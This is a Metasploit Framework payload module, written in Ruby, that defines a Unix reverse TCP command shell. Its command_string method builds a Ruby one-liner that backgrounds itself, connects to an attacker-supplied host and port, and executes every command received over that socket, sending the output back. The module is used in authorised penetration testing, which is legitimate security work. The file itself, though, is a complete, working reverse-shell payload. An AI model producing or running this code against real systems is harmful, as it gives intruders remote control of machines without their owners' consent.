##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 133

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'        => 'Unix Command Shell, Reverse TCP (via Ruby)',
     'Description' => 'Connect back and create a command shell via Ruby',
     'Author'      => 'kris katterjohn',
     'License'     => MSF_LICENSE,
     'Platform'    => 'unix',
     'Arch'        => ARCH_CMD,
     'Handler'     => Msf::Handler::ReverseTcp,
     'Session'     => Msf::Sessions::CommandShell,
     'PayloadType' => 'cmd',
     'RequiredCmd' => 'ruby',
     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
    register_advanced_options(
      [
        OptString.new('RubyPath', [true, 'The path to the Ruby executable', 'ruby'])
      ]
    )
  end

  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  def command_string
    lhost = datastore['LHOST']
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    "#{datastore['RubyPath']} -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
  end
end
